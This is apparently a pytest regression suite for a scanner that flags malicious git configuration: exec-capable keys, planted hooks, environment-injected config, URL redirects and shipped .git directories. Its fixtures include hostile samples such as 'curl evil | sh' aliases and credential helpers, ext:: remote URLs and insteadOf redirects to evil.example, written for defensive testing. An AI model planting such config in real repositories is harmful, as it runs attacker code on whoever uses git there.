"""Regression tests for the PR #45 review of scan_git_config.py.

One class per review finding:

  HIGH  parser differential: a key on the SAME LINE as its section header is
        valid git config and was not parsed. The acceptance gate is a
        differential against real `git config -f <file> --list`.
  HIGH  first-class command-executing keys were missing from the table.
  MED   the rename chain was single-file only; direct writes into .git/config
        or .git/hooks and env-injected config were not covered.
  MED   GC-ROOT-001 false positives on common developer setups (husky,
        `gh auth setup-git`, 1Password SSH signing).
  MED   a linked worktree was flagged when its recorded path spelled a
        symlink differently than the scan path (macOS /tmp -> /private/tmp),
        for plain repositories and submodule worktrees alike.
  LOW   root .git/hooks was never inspected.
  LOW   any archive `.git/` member was CRITICAL; bare presence is HIGH now.
  LOW   every R_* rule id must be registered in data/rule_ids.csv.
"""

import io
import os
import re
import shutil
import subprocess
import sys
import tarfile
import textwrap
import time
import zipfile

import pytest

import scan_archive
import scan_git_config as scanner

_HAVE_GIT = shutil.which("git") is not None
needs_git = pytest.mark.skipif(not _HAVE_GIT, reason="git not installed")


def test_many_bindings_do_not_exhaust_git_config_budget():
    text = "".join(f'let safe{i}="value"\n' for i in range(8000))
    text += "git config core.fsmonitor ./x.sh\nmv stage .git\n"
    start = time.monotonic()
    findings = scanner.scan_rename_chain_text(text, "plant.sh")
    assert time.monotonic() - start < 2
    assert any(f.rule_id == "GC-REN-001" for f in findings)


def _ids(findings):
    return {f.rule_id for f in findings}


def _keys(config, root=False, repo_root=None):
    kwargs = {"root": root}
    if repo_root is not None:
        kwargs["repo_root"] = repo_root
    return {e["key"] for e in scanner.armed_config_entries(config, **kwargs)}


def _git(cwd, *args, check=True):
    env = dict(os.environ, GIT_CONFIG_GLOBAL=os.devnull,
               GIT_CONFIG_SYSTEM=os.devnull, GIT_TERMINAL_PROMPT="0")
    return subprocess.run(
        ["git", "-c", "user.email=t@example.com", "-c", "user.name=t",
         "-c", "protocol.file.allow=always", *args],
        cwd=str(cwd), env=env, capture_output=True, text=True, check=check)


# --------------------------------------------------------------------------
# HIGH: parser differential against real git
# --------------------------------------------------------------------------

# Every fixture is valid git config that carries at least one exec-capable
# key. The differential below asks REAL git what it parses.
PARSER_FIXTURES = {
    "same-line": "[core] fsmonitor = ./x.sh\n",
    "same-line-no-spaces": "[core]fsmonitor=./x.sh\n",
    "same-line-subsection": '[filter "evil"] clean = ./x.sh\n',
    "same-line-then-comment": "[core] fsmonitor = ./x.sh ; trailing\n",
    "same-line-alias": '[alias] pwn = !sh -c "curl evil | sh"\n',
    "two-line-baseline": "[core]\n\tfsmonitor = ./x.sh\n",
    "dotted-section": "[filter.evil]\n\tclean = ./x.sh\n",
    "dotted-section-same-line": "[filter.evil] smudge = ./x.sh\n",
    "continuation": "[core]\n\tfsmonitor = \\\n./x.sh\n",
    "continuation-mid-value": "[core]\n\tsshCommand = ssh \\\n -i /tmp/k\n",
    "escaped-subsection-quote": '[remote "a\\"b"]\n\tuploadpack = sh -c id\n',
    "mixed-case-header": "[CoRe]\n\tFsMonitor = ./x.sh\n",
    "quoted-value": '[core]\n\tsshCommand = "ssh -i /tmp/k"\n',
    "partly-quoted-value": '[core]\n\tsshCommand = ssh "-i /tmp/k"\n',
    "comment-without-space": "[core]\n\tpager = ./evil#note\n",
    "semicolon-comment-without-space": "[core]\n\tpager = ./evil;note\n",
    "diff-textconv": '[diff "x"]\n\ttextconv = sh -c id\n',
    "pager-per-command": "[pager]\n\tlog = sh -c id\n",
    "merge-driver": '[merge "x"]\n\tdriver = sh -c id\n',
    "sequence-editor": "[sequence]\n\teditor = sh -c id\n",
    "remote-uploadpack": '[remote "origin"]\n\tuploadpack = sh -c id\n',
    "remote-ext-url": '[remote "origin"]\n\turl = ext::sh -c id\n',
    "core-gitproxy": "[core]\n\tgitProxy = sh -c id\n",
    "mergetool-cmd": '[mergetool "x"]\n\tcmd = sh -c id\n',
    "difftool-cmd": '[difftool "x"]\n\tcmd = sh -c id\n',
    "browser-cmd": '[browser "x"]\n\tcmd = sh -c id\n',
    "man-cmd": '[man "x"]\n\tcmd = sh -c id\n',
    "submodule-update": '[submodule "x"]\n\tupdate = !sh -c id\n',
    "interactive-difffilter": "[interactive]\n\tdiffFilter = sh -c id\n",
    "alternate-refs-command": "[core]\n\talternateRefsCommand = sh -c id\n",
    "gpg-ssh-defaultkeycommand": '[gpg "ssh"]\n\tdefaultKeyCommand = sh -c id\n',
    "bom": "﻿[core]\n\tfsmonitor = ./x.sh\n",
}


def _git_list(path):
    """`git config -f <path> --list -z` as [(dotted_key, value_or_None)]."""
    out = _git(os.path.dirname(path) or ".", "config", "-f", str(path),
               "--list", "-z").stdout
    entries = []
    for chunk in out.split("\0"):
        if not chunk:
            continue
        if "\n" in chunk:
            key, value = chunk.split("\n", 1)
        else:
            key, value = chunk, None
        entries.append((key, value))
    return entries


def _canonical_config(entries):
    """git's own reading of a config file, re-emitted in the plain two-line
    form: the reference the scanner's parse of the ORIGINAL text must cover."""
    lines = []
    for dotted, value in entries:
        parts = dotted.split(".")
        section, key = parts[0], parts[-1]
        sub = ".".join(parts[1:-1])
        if sub:
            sub = sub.replace("\\", "\\\\").replace('"', '\\"')
        lines.append(f'[{section} "{sub}"]' if sub else f"[{section}]")
        if value is None:
            lines.append(f"\t{key}")
        else:
            escaped = value.replace("\\", "\\\\").replace('"', '\\"')
            lines.append(f'\t{key} = "{escaped}"')
    return "\n".join(lines) + "\n"


@needs_git
class TestParserDifferentialAgainstRealGit:
    @pytest.mark.parametrize("name", sorted(PARSER_FIXTURES))
    def test_scanner_covers_every_exec_key_git_parses(self, tmp_path, name):
        cfg = tmp_path / "config"
        cfg.write_bytes(PARSER_FIXTURES[name].encode("utf-8"))

        git_entries = _git_list(cfg)
        reference = _keys(_canonical_config(git_entries))
        scanned = _keys(PARSER_FIXTURES[name])

        # Non-vacuous: git itself parsed an exec-capable key out of it.
        assert reference, (name, git_entries)
        assert scanned >= reference, (name, scanned, reference, git_entries)

    def test_the_review_repro_is_the_one_git_reads(self, tmp_path):
        """`[core] fsmonitor = ./x.sh` -> git prints core.fsmonitor=./x.sh."""
        cfg = tmp_path / "config"
        cfg.write_text("[core] fsmonitor = ./x.sh\n")
        assert _git_list(cfg) == [("core.fsmonitor", "./x.sh")]
        assert _keys(cfg.read_text()) == {"core.fsmonitor"}


class TestSameLineSectionAndKeyEndToEnd:
    SAME_LINE = "[core] fsmonitor = ./x.sh\n"

    def test_root_config_is_flagged(self, tmp_path):
        (tmp_path / ".git").mkdir()
        (tmp_path / ".git" / "config").write_text(self.SAME_LINE)

        findings = scanner.scan_repo(str(tmp_path))

        armed = [f for f in findings if f.rule_id == "GC-ROOT-001"]
        assert len(armed) == 1 and armed[0].severity == "high"

    def test_shipped_config_is_critical_not_presence_only(self, tmp_path):
        nested = tmp_path / "vendor" / ".git"
        nested.mkdir(parents=True)
        (nested / "config").write_text(self.SAME_LINE)

        findings = scanner.scan_repo(str(tmp_path))

        assert any(f.rule_id == "GC-SHIP-002" and f.severity == "critical"
                   for f in findings), _ids(findings)

    def test_gitmodules_same_line_update_exec_is_flagged(self):
        text = '[submodule "x"] update = !sh -c id\n\tpath = x\n\turl = ../x\n'
        assert [f.rule_id for f in scanner.scan_gitmodules_text(text, ".gitmodules")] \
            == ["GC-MOD-001"]

    def test_archive_member_same_line_is_critical(self, tmp_path):
        with zipfile.ZipFile(tmp_path / "ws.zip", "w") as zf:
            zf.writestr("proj/.git/config", self.SAME_LINE)
        findings = scan_archive.scan_repo(str(tmp_path))
        assert any(f.rule_id == "GC-SHIP-002" and f.severity == "critical"
                   for f in findings), _ids(findings)

    def test_a_same_line_comment_only_header_is_not_a_key(self):
        assert _keys("[core] ; fsmonitor = ./x.sh\n") == set()

    def test_a_same_line_inert_value_stays_inert(self):
        assert _keys("[core] fsmonitor = false\n") == set()
        assert _keys("[core] hooksPath = /dev/null\n") == set()


# --------------------------------------------------------------------------
# HIGH: the exec-key table
# --------------------------------------------------------------------------

EXEC_KEY_CASES = [
    ('[diff "x"]\n\ttextconv = sh -c id\n', "diff.textconv"),
    ('[diff "x"]\n\tcommand = sh -c id\n', "diff.command"),
    ("[pager]\n\tlog = sh -c id\n", "pager.log"),
    ("[pager]\n\tstatus = sh -c id\n", "pager.status"),
    ("[pager]\n\tdiff = sh -c id\n", "pager.diff"),
    ('[merge "x"]\n\tdriver = sh -c id %O %A %B\n', "merge.driver"),
    ("[sequence]\n\teditor = sh -c id\n", "sequence.editor"),
    ('[remote "origin"]\n\tuploadpack = sh -c id\n', "remote.uploadpack"),
    ('[remote "origin"]\n\treceivepack = sh -c id\n', "remote.receivepack"),
    ('[remote "origin"]\n\turl = ext::sh -c id\n', "remote.url"),
    ('[remote "origin"]\n\tpushurl = fd::3\n', "remote.pushurl"),
    ("[core]\n\tgitProxy = sh -c id\n", "core.gitproxy"),
    ('[difftool "x"]\n\tcmd = sh -c id\n', "difftool.cmd"),
    ('[mergetool "x"]\n\tcmd = sh -c id\n', "mergetool.cmd"),
    ('[browser "x"]\n\tcmd = sh -c id\n', "browser.cmd"),
    ('[man "x"]\n\tcmd = sh -c id\n', "man.cmd"),
    ('[submodule "s"]\n\tupdate = !sh -c id\n', "submodule.update"),
    ("[interactive]\n\tdiffFilter = sh -c id\n", "interactive.difffilter"),
    ("[core]\n\talternateRefsCommand = sh -c id\n", "core.alternaterefscommand"),
]


class TestExecKeyTable:
    @pytest.mark.parametrize("config,key", EXEC_KEY_CASES)
    def test_shipped_config_arms_the_key(self, config, key):
        assert key in _keys(config)

    @pytest.mark.parametrize("config,key", EXEC_KEY_CASES)
    def test_root_config_arms_a_shell_one_liner(self, config, key):
        """The review's scenario: at the scan root a missing key meant NO
        finding at all."""
        assert key in _keys(config, root=True)

    @pytest.mark.parametrize("config,key", EXEC_KEY_CASES)
    def test_scan_repo_reports_the_root_key(self, tmp_path, config, key):
        (tmp_path / ".git").mkdir()
        (tmp_path / ".git" / "config").write_text(config)
        findings = scanner.scan_repo(str(tmp_path))
        assert any(key in f.title for f in findings), (key, [f.title for f in findings])

    @pytest.mark.parametrize("config", [
        "[pager]\n\tlog = false\n",
        "[pager]\n\tlog = true\n",
        '[diff "pdf"]\n\ttextconv = pdftotext -layout\n',
        '[mergetool "vscode"]\n\tcmd = code --wait $MERGED\n',
        '[remote "origin"]\n\tuploadpack = git-upload-pack\n',
        '[remote "origin"]\n\turl = https://example.com/r.git\n',
        "[sequence]\n\teditor = code --wait\n",
        "[core]\n\tgitProxy =\n",
        '[submodule "s"]\n\tupdate = checkout\n',
    ])
    def test_developer_setups_stay_quiet_at_the_root(self, config):
        assert _keys(config, root=True) == set(), config

    def test_a_relocatable_path_is_armed_even_at_the_root(self):
        assert "diff.textconv" in _keys(
            '[diff "x"]\n\ttextconv = ./tools/conv\n', root=True)
        assert "diff.textconv" in _keys(
            '[diff "x"]\n\ttextconv = /tmp/conv\n', root=True)

    def test_every_key_in_the_case_list_is_pinned_against_git_help(self):
        """The reviewer asked for the table to be cross-checked against `git
        help config` for command/program/shell keys and pinned. This is the
        pin: each dotted key below is a documented command-executing config
        key, and a removal from the classifier fails here."""
        documented = {
            "core.fsmonitor", "core.hookspath", "core.sshcommand", "core.pager",
            "core.editor", "core.askpass", "core.gitproxy",
            "core.alternaterefscommand", "gpg.program", "gpg.defaultkeycommand",
            "diff.external", "diff.textconv", "diff.command", "merge.driver",
            "filter.clean", "filter.smudge", "filter.process", "pager.log",
            "sequence.editor", "remote.uploadpack", "remote.receivepack",
            "remote.url", "difftool.cmd", "mergetool.cmd", "browser.cmd",
            "man.cmd", "interactive.difffilter", "submodule.update",
            "credential.helper", "alias.x", "include.path",
        }
        exercised = {key for _cfg, key in EXEC_KEY_CASES} | {
            "core.fsmonitor", "core.hookspath", "core.sshcommand", "core.pager",
            "core.editor", "core.askpass", "gpg.program", "diff.external",
            "filter.clean", "filter.smudge", "filter.process",
            "credential.helper", "alias.x", "include.path",
            "gpg.defaultkeycommand",
        }
        assert documented - exercised == set()


class TestTrafficRedirectRule:
    def test_insteadof_to_another_host_is_high_everywhere(self):
        config = ('[url "https://evil.example/"]\n'
                  '\tinsteadOf = https://github.com/\n')
        for root in (False, True):
            entries = scanner.armed_config_entries(config, root=root)
            assert [(e["rule_id"], e["severity"]) for e in entries] \
                == [("GC-NET-001", "high")], root

    def test_pushinsteadof_is_covered(self):
        config = ('[url "https://evil.example/"]\n'
                  '\tpushInsteadOf = https://github.com/\n')
        assert _keys(config) == {"url.pushinsteadof"}

    def test_same_host_scheme_rewrite_is_quiet_at_the_root(self):
        config = ('[url "ssh://git@github.com/"]\n'
                  '\tinsteadOf = https://github.com/\n')
        assert _keys(config, root=True) == set()
        assert _keys(config, root=False) == {"url.insteadof"}

    def test_proxy_and_sslverify(self):
        config = "[http]\n\tproxy = http://evil.example:3128\n\tsslVerify = false\n"
        shipped = scanner.armed_config_entries(config, root=False)
        assert {e["key"] for e in shipped} == {"http.proxy", "http.sslverify"}
        assert all(e["severity"] == "high" for e in shipped)
        root = scanner.armed_config_entries(config, root=True)
        assert all(e["severity"] == "medium" for e in root)

    def test_sslverify_true_is_quiet(self):
        assert _keys("[http]\n\tsslVerify = true\n") == set()

    def test_finding_carries_the_redirect_rule_not_the_exec_rule(self, tmp_path):
        nested = tmp_path / "vendor" / ".git"
        nested.mkdir(parents=True)
        (nested / "config").write_text(
            '[url "https://evil.example/"]\n\tinsteadOf = https://github.com/\n')
        findings = scanner.scan_repo(str(tmp_path))
        redirect = [f for f in findings if f.rule_id == "GC-NET-001"]
        assert len(redirect) == 1
        assert redirect[0].severity == "high"
        assert redirect[0].category == "git-config-redirect"
        assert not any(f.rule_id == "GC-SHIP-002" for f in findings)


# --------------------------------------------------------------------------
# MED: direct writes, env-injected config, split chain
# --------------------------------------------------------------------------

class TestDirectWritesAndEnvInjection:
    def _scan(self, tmp_path, content, name="setup.sh"):
        (tmp_path / name).write_text(content)
        return scanner.scan_repo(str(tmp_path))

    def test_review_repro_python_direct_write_without_rename(self, tmp_path):
        findings = self._scan(tmp_path, textwrap.dedent("""\
            import os
            os.makedirs('pkg/.git')
            with open('pkg/.git/config', 'w') as f:
                f.write('[core]\\n\\tfsmonitor = ./x.sh\\n')
            """), name="setup.py")
        hits = [f for f in findings if f.rule_id == "GC-WRITE-001"]
        assert hits and hits[0].severity == "high"

    def test_shell_redirect_into_dot_git_config(self, tmp_path):
        findings = self._scan(
            tmp_path,
            "printf '[core]\\n\\tfsmonitor = ./x.sh\\n' >> vendor/.git/config\n")
        assert "GC-WRITE-001" in _ids(findings)

    def test_writing_dot_git_config_without_an_exec_key_is_quiet(self, tmp_path):
        findings = self._scan(
            tmp_path, "printf '[user]\\n\\tname = x\\n' >> vendor/.git/config\n")
        assert "GC-WRITE-001" not in _ids(findings)

    def test_hook_write_is_a_medium_review_prompt(self, tmp_path):
        findings = self._scan(
            tmp_path, "cp evil.sh vendor/.git/hooks/post-checkout\n")
        hits = [f for f in findings if f.rule_id == "GC-WRITE-001"]
        assert hits and hits[0].severity == "medium"

    def test_a_sample_or_unknown_hook_name_is_quiet(self, tmp_path):
        findings = self._scan(
            tmp_path,
            "cp a .git/hooks/pre-commit.sample\ncp b .git/hooks/README\n")
        assert "GC-WRITE-001" not in _ids(findings)

    def test_git_config_count_env_injection(self, tmp_path):
        findings = self._scan(tmp_path, textwrap.dedent("""\
            export GIT_CONFIG_COUNT=1 GIT_CONFIG_KEY_0=core.fsmonitor GIT_CONFIG_VALUE_0=./x.sh
            git status
            """))
        hits = [f for f in findings if f.rule_id == "GC-ENV-001"]
        assert hits and hits[0].severity == "high"

    def test_env_key_with_an_unresolved_value_is_flagged(self, tmp_path):
        findings = self._scan(
            tmp_path, "export GIT_CONFIG_COUNT=1 GIT_CONFIG_KEY_0=core.sshCommand\n")
        assert "GC-ENV-001" in _ids(findings)

    def test_git_config_global_pointing_into_the_workspace(self, tmp_path):
        findings = self._scan(tmp_path, "export GIT_CONFIG_GLOBAL=$PWD/evil.cfg\n")
        assert "GC-ENV-001" in _ids(findings)

    @pytest.mark.parametrize("line", [
        "export GIT_CONFIG_GLOBAL=/dev/null",
        "export GIT_CONFIG_SYSTEM=/dev/null",
        "export GIT_CONFIG_GLOBAL=/home/ci/.gitconfig",
        "export GIT_CONFIG_COUNT=1 GIT_CONFIG_KEY_0=core.pager GIT_CONFIG_VALUE_0=cat",
        "export GIT_CONFIG_COUNT=1 GIT_CONFIG_KEY_0=user.name GIT_CONFIG_VALUE_0=ci",
        "export GIT_CONFIG_COUNT=1 GIT_CONFIG_KEY_0=core.fsmonitor GIT_CONFIG_VALUE_0=false",
    ])
    def test_hardening_and_benign_env_stay_quiet(self, tmp_path, line):
        assert "GC-ENV-001" not in _ids(self._scan(tmp_path, line + "\n"))

    def test_dash_c_with_an_exec_value_is_medium(self, tmp_path):
        findings = self._scan(
            tmp_path, "git -c core.sshCommand='sh -c id' fetch origin\n")
        hits = [f for f in findings if f.rule_id == "GC-ENV-001"]
        assert hits and hits[0].severity == "medium"

    @pytest.mark.parametrize("line", [
        "git -c core.pager=cat log",
        "git -c user.name=ci commit -m x",
        "git -c core.fsmonitor=false status",
        "git -C repo fsmonitor--daemon status",
    ])
    def test_ordinary_dash_c_is_quiet(self, tmp_path, line):
        assert "GC-ENV-001" not in _ids(self._scan(tmp_path, line + "\n"))

    def test_the_rules_run_on_archive_members_and_scan_file(self, tmp_path):
        body = "export GIT_CONFIG_GLOBAL=$PWD/evil.cfg\n"
        with zipfile.ZipFile(tmp_path / "a.zip", "w") as zf:
            zf.writestr("proj/setup.sh", body)
        assert "GC-ENV-001" in _ids(scan_archive.scan_repo(str(tmp_path)))
        f = tmp_path / "one.sh"
        f.write_text(body)
        assert "GC-ENV-001" in _ids(scanner.scan_file(str(f), "one.sh"))


class TestSplitChainAcrossFiles:
    def test_sibling_files_correlate(self, tmp_path):
        """The review's a.sh / b.sh repro."""
        (tmp_path / "a.sh").write_text(
            "git --git-dir=stage config core.fsmonitor ./x.sh\n")
        (tmp_path / "b.sh").write_text("mv stage .git\n")
        findings = scanner.scan_repo(str(tmp_path))
        chain = [f for f in findings if f.rule_id == "GC-REN-001"]
        assert len(chain) == 1 and chain[0].severity == "high"
        assert chain[0].file == "b.sh"

    def test_a_single_file_with_both_arms_stays_critical_and_single(self, tmp_path):
        (tmp_path / "a.sh").write_text(
            "git config core.fsmonitor ./x.sh\nmv stage .git\n")
        chain = [f for f in scanner.scan_repo(str(tmp_path))
                 if f.rule_id == "GC-REN-001"]
        assert len(chain) == 1 and chain[0].severity == "critical"

    def test_only_one_arm_in_a_directory_is_quiet(self, tmp_path):
        (tmp_path / "a.sh").write_text("git config core.fsmonitor ./x.sh\n")
        (tmp_path / "b.sh").write_text("echo hello\n")
        assert "GC-REN-001" not in _ids(scanner.scan_repo(str(tmp_path)))


# --------------------------------------------------------------------------
# MED: root false positives on common developer setups
# --------------------------------------------------------------------------

class TestRootConfigFalsePositives:
    def _root(self, tmp_path, config):
        (tmp_path / ".git").mkdir()
        (tmp_path / ".git" / "config").write_text(config)
        return scanner.scan_repo(str(tmp_path))

    def test_husky_hookspath_inside_the_tree_is_medium_not_high(self, tmp_path):
        (tmp_path / ".husky" / "_").mkdir(parents=True)
        findings = self._root(tmp_path, "[core]\n\thooksPath = .husky/_\n")
        armed = [f for f in findings if f.rule_id == "GC-ROOT-001"]
        assert len(armed) == 1
        assert armed[0].severity == "medium"

    @pytest.mark.parametrize("value", [
        "../outside", "/etc/hooks", "/tmp/h", "~/hooks", "/var/tmp/x",
    ])
    def test_hookspath_escaping_the_tree_stays_high(self, tmp_path, value):
        findings = self._root(tmp_path, f"[core]\n\thooksPath = {value}\n")
        armed = [f for f in findings if f.rule_id == "GC-ROOT-001"]
        assert len(armed) == 1 and armed[0].severity == "high", value

    def test_hookspath_in_a_shipped_config_is_still_critical(self, tmp_path):
        nested = tmp_path / "vendor" / ".git"
        nested.mkdir(parents=True)
        (nested / "config").write_text("[core]\n\thooksPath = .husky/_\n")
        findings = scanner.scan_repo(str(tmp_path))
        assert any(f.rule_id == "GC-SHIP-002" and f.severity == "critical"
                   for f in findings)

    def test_gh_auth_setup_git_credential_helper_is_quiet(self, tmp_path):
        findings = self._root(
            tmp_path,
            '[credential "https://github.com"]\n'
            "\thelper = !/usr/bin/gh auth git-credential\n")
        assert findings == []

    @pytest.mark.parametrize("helper", [
        "!gh auth git-credential", "manager", "git-credential-manager",
        "!/usr/local/share/gcm-core/git-credential-manager",
    ])
    def test_installed_credential_helpers_are_quiet_at_the_root(self, helper):
        assert _keys(f"[credential]\n\thelper = {helper}\n", root=True) == set()

    def test_1password_ssh_signing_program_is_quiet_at_the_root(self, tmp_path):
        findings = self._root(
            tmp_path,
            '[gpg "ssh"]\n\tprogram = '
            "/Applications/1Password.app/Contents/MacOS/op-ssh-sign\n")
        assert findings == []

    @pytest.mark.parametrize("config", [
        # A basename is not an identity: an attacker names his binary too.
        '[gpg "ssh"]\n\tprogram = ./op-ssh-sign\n',
        '[gpg "ssh"]\n\tprogram = /tmp/op-ssh-sign\n',
        "[credential]\n\thelper = !./gh auth git-credential\n",
        # Quoted: an unquoted `;` starts a COMMENT in git config, so the tail
        # would be dropped by git itself.
        '[credential]\n\thelper = "!gh auth git-credential; curl evil | sh"\n',
        "[credential]\n\thelper = !sh -c 'gh auth git-credential'\n",
    ])
    def test_spoofed_allow_list_names_are_still_armed_at_the_root(self, config):
        assert _keys(config, root=True) != set(), config

    def test_allow_list_is_root_only(self):
        """In a SHIPPED config nothing is trusted by name."""
        assert _keys('[gpg "ssh"]\n\tprogram = /a/op-ssh-sign\n') == {"gpg.program"}
        assert _keys("[credential]\n\thelper = !gh auth git-credential\n") \
            == {"credential.helper"}


# --------------------------------------------------------------------------
# MED: worktree topology (real git)
# --------------------------------------------------------------------------

@needs_git
class TestLinkedWorktreesAreNotFlagged:
    """Real repositories, real `git worktree add`, real `git submodule add`."""

    def _repo(self, path):
        path.mkdir(parents=True)
        _git(path, "init", "-q")
        (path / "f.txt").write_text("x\n")
        _git(path, "add", "f.txt")
        _git(path, "commit", "-q", "-m", "init")
        return path

    def _pointer_findings(self, path):
        return [f for f in scanner.scan_repo(str(path))
                if f.rule_id == "GC-SHIP-004"]

    def test_plain_linked_worktree_is_silent(self, tmp_path):
        main = self._repo(tmp_path / "main")
        wt = tmp_path / "wt"
        _git(main, "worktree", "add", "-q", "--detach", str(wt))
        assert self._pointer_findings(wt) == []

    def test_worktree_of_a_submodule_is_silent(self, tmp_path):
        """The review's maintainer layout: `git worktree add` run inside a
        submodule, so .git -> <super>/.git/modules/<sub>/worktrees/<name>."""
        sub_src = self._repo(tmp_path / "sub_src")
        superproj = self._repo(tmp_path / "super")
        _git(superproj, "submodule", "add", "-q", str(sub_src), "vendor/sub")
        _git(superproj, "commit", "-q", "-m", "add sub")
        sub = superproj / "vendor" / "sub"
        wt = tmp_path / "sub_wt"
        _git(sub, "worktree", "add", "-q", "--detach", str(wt))

        assert "modules" in (wt / ".git").read_text()
        assert self._pointer_findings(wt) == []

    def test_worktree_scanned_through_a_symlinked_directory_is_silent(self, tmp_path):
        """macOS: a worktree created under /tmp is recorded by git as
        /private/tmp/...; the scan path is /tmp/.... The genuine link must
        still prove out."""
        if sys.platform == "win32":
            pytest.skip("symlink privileges")
        main = self._repo(tmp_path / "main")
        real_parent = tmp_path / "real_parent"
        real_parent.mkdir()
        link_parent = tmp_path / "link_parent"
        link_parent.symlink_to(real_parent, target_is_directory=True)
        # Create through the REAL path so git records the real spelling, then
        # scan through the symlinked spelling.
        _git(main, "worktree", "add", "-q", "--detach", str(real_parent / "wt"))
        assert self._pointer_findings(link_parent / "wt") == []

    def test_submodule_worktree_through_a_symlink_is_silent(self, tmp_path):
        if sys.platform == "win32":
            pytest.skip("symlink privileges")
        sub_src = self._repo(tmp_path / "sub_src")
        superproj = self._repo(tmp_path / "super")
        _git(superproj, "submodule", "add", "-q", str(sub_src), "vendor/sub")
        _git(superproj, "commit", "-q", "-m", "add sub")
        real_parent = tmp_path / "real_parent"
        real_parent.mkdir()
        link_parent = tmp_path / "link_parent"
        link_parent.symlink_to(real_parent, target_is_directory=True)
        _git(superproj / "vendor" / "sub", "worktree", "add", "-q", "--detach",
             str(real_parent / "wt"))
        assert self._pointer_findings(link_parent / "wt") == []

    def test_a_forged_back_pointer_is_still_flagged_through_a_symlink(self, tmp_path):
        """The symlink tolerance must not become proof: a manufactured target
        directory with a matching back-link is not a real worktree."""
        if sys.platform == "win32":
            pytest.skip("symlink privileges")
        forged = tmp_path / "forged_meta"
        forged.mkdir()
        (forged / "commondir").write_text(".\n")
        (forged / "HEAD").write_text("ref: refs/heads/x\n")
        real_parent = tmp_path / "real_parent"
        real_parent.mkdir()
        link_parent = tmp_path / "link_parent"
        link_parent.symlink_to(real_parent, target_is_directory=True)
        wt = real_parent / "wt"
        wt.mkdir()
        (wt / ".git").write_text(f"gitdir: {forged}\n")
        (forged / "gitdir").write_text(str(wt / ".git") + "\n")

        assert self._pointer_findings(link_parent / "wt") != []


# --------------------------------------------------------------------------
# LOW: root hooks
# --------------------------------------------------------------------------

class TestRootHooks:
    def _root(self, tmp_path, config="[core]\n\tbare = false\n", hooks=()):
        git_dir = tmp_path / ".git"
        (git_dir / "hooks").mkdir(parents=True)
        (git_dir / "config").write_text(config)
        for name in hooks:
            (git_dir / "hooks" / name).write_text("#!/bin/sh\nid\n")
        return scanner.scan_repo(str(tmp_path))

    def test_non_sample_root_hook_is_medium(self, tmp_path):
        findings = self._root(tmp_path, hooks=("post-checkout",))
        hooks = [f for f in findings if f.rule_id == "GC-ROOT-002"]
        assert len(hooks) == 1 and hooks[0].severity == "medium"

    def test_root_hook_with_an_armed_root_config_is_high(self, tmp_path):
        findings = self._root(
            tmp_path, config="[core]\n\tfsmonitor = ./x.sh\n",
            hooks=("post-checkout",))
        hooks = [f for f in findings if f.rule_id == "GC-ROOT-002"]
        assert len(hooks) == 1 and hooks[0].severity == "high"

    def test_sample_and_unknown_files_are_not_hooks(self, tmp_path):
        findings = self._root(
            tmp_path, hooks=("pre-commit.sample", "PRE-PUSH.SAMPLE", "README"))
        assert "GC-ROOT-002" not in _ids(findings)

    def test_root_hooks_are_capped(self, tmp_path):
        names = ("pre-commit", "post-commit", "pre-push", "commit-msg",
                 "post-merge", "post-checkout", "pre-rebase")
        findings = self._root(tmp_path, hooks=names)
        assert len([f for f in findings if f.rule_id == "GC-ROOT-002"]) \
            == scanner._MAX_HOOK_FINDINGS


# --------------------------------------------------------------------------
# LOW: archive presence is HIGH, armed content stays CRITICAL
# --------------------------------------------------------------------------

class TestArchiveGitPresenceSeverity:
    def _zip(self, tmp_path, members):
        with zipfile.ZipFile(tmp_path / "a.zip", "w") as zf:
            for name, data in members.items():
                zf.writestr(name, data)
        return scan_archive.scan_repo(str(tmp_path))

    def test_fixture_repository_archive_is_high_not_critical(self, tmp_path):
        """go-git / dulwich style: a fixture repo with a stock config."""
        findings = self._zip(tmp_path, {
            "fixtures/repo/.git/HEAD": "ref: refs/heads/master\n",
            "fixtures/repo/.git/config": "[core]\n\tbare = false\n",
            "fixtures/repo/.git/hooks/pre-commit.sample": "#!/bin/sh\n",
            "fixtures/repo/README": "hi\n",
        })
        git_findings = [f for f in findings if f.scanner == "git_config"]
        assert {f.rule_id for f in git_findings} == {"GC-SHIP-003"}
        assert all(f.severity == "high" for f in git_findings)
        assert not any(f.severity == "critical" for f in git_findings)

    def test_armed_config_in_an_archive_is_critical(self, tmp_path):
        findings = self._zip(tmp_path, {
            "p/.git/config": "[core] fsmonitor = ./x.sh\n"})
        assert any(f.rule_id == "GC-SHIP-002" and f.severity == "critical"
                   for f in findings)

    def test_non_sample_hook_in_an_archive_is_critical(self, tmp_path):
        findings = self._zip(tmp_path, {
            "p/.git/hooks/post-checkout": "#!/bin/sh\nid\n"})
        assert any(f.rule_id == "GC-SHIP-005" and f.severity == "critical"
                   for f in findings)


# --------------------------------------------------------------------------
# LOW: rule id registration
# --------------------------------------------------------------------------

class TestEveryRuleIdIsRegistered:
    def test_every_r_constant_appears_in_rule_ids_csv(self):
        """The generator scrapes tables, not R_* constants, so a GC row that
        is only in the module is silently dropped by a regen and never
        reaches the csv. This is the guard against adding one without the
        other."""
        csv_path = os.path.join(os.path.dirname(scanner.__file__), "..",
                                "data", "rule_ids.csv")
        with open(csv_path, encoding="utf-8") as fh:
            registered = {line.split(",", 1)[0] for line in fh}
        constants = {
            value for name, value in vars(scanner).items()
            if re.fullmatch(r"R_[A-Z_]+", name)
            and isinstance(value, str) and value.startswith("GC-")}

        assert constants, "no R_* constants found"
        assert constants - registered == set()

    def test_every_registered_gc_row_is_a_module_constant(self):
        csv_path = os.path.join(os.path.dirname(scanner.__file__), "..",
                                "data", "rule_ids.csv")
        with open(csv_path, encoding="utf-8") as fh:
            gc_rows = {line.split(",", 1)[0] for line in fh
                       if line.startswith("GC-")}
        constants = {
            value for name, value in vars(scanner).items()
            if re.fullmatch(r"R_[A-Z_]+", name)
            and isinstance(value, str) and value.startswith("GC-")}
        assert gc_rows - constants == set()
